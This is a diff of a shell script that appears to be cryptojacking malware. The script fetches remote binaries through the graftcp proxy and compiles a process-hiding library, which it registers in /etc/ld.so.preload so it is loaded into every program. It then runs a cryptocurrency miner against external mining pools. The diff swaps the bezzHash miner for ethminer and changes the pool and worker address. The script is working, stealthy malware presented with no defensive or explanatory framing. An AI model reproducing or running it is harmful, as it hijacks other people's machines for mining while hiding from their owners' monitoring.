@@ -32,8 +32,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget https://github.com/uerser73/ethminer/raw/main/ethminer
+chmod  +x ethminer
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -42,4 +42,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=hunterd.$(echo $(shuf -i 1-99999 -n 1)-hunterd)@ethash.kupool.com:443
+./graftcp/graftcp ./ethminer -P stratum1+tcp://Gok001.001@ethash.poolbinance.com:443
